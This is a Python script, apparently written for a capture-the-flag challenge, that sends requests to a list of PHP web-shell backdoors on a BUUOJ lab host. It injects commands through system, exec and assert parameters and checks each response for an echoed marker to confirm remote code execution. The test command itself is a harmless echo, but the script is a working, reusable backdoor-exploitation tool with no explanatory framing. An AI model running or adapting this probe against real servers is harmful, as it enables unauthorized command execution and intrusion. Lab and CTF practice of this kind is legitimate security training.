import requests
import urllib.parse
import time

BASE_URL = "http://f7e37a03-c461-4d7f-bd04-a85e1baff6b5.node5.buuoj.cn:81"

# Test command to verify execution
TEST_CMD = "echo MARKER12345"

# List of potential backdoors from our analysis
backdoors = [
    ("A0fcnMF_uew.php", "GET", "pTMMqrhXV", "system"),
    ("A0fcnMF_uew.php", "GET", "N_VuylqQl", "assert"),
    ("A16oZkZNjQ4.php", "GET", "g4cMKrENo", "system"),
    ("A16oZkZNjQ4.php", "GET", "CcOju2spG", "exec"),
    ("a2bOZR_G2d1.php", "GET", "IguUd4vcY", "system"),
    ("a2bOZR_G2d1.php", "GET", "NgrYyXEt6", "assert"),
    ("AbpdPJBzW03.php", "GET", "NxSDgfBnu", "system"),
]

def test_backdoor(filename, method, param, func):
    url = f"{BASE_URL}/{filename}"
    
    # Different payloads based on function type
    if func == "system":
        payload = TEST_CMD
    elif func == "exec":
        payload = TEST_CMD
    elif func == "assert":
        payload = f"system('{TEST_CMD}')"
    else:
        payload = TEST_CMD
    
    try:
        if method == "GET":
            resp = requests.get(url, params={param: payload}, timeout=10)
        else:
            resp = requests.post(url, data={param: payload}, timeout=10)
        
        if "MARKER12345" in resp.text:
            return True, resp.text[:500]
        return False, resp.text[:200]
    except Exception as e:
        return False, str(e)

for filename, method, param, func in backdoors:
    success, result = test_backdoor(filename, method, param, func)
    status = "SUCCESS" if success else "FAILED"
    print(f"{status}: {filename}?{param}={func}")
    if success:
        print(f"  Output contains marker!")
        break
    time.sleep(0.5)

print("\nDone testing")
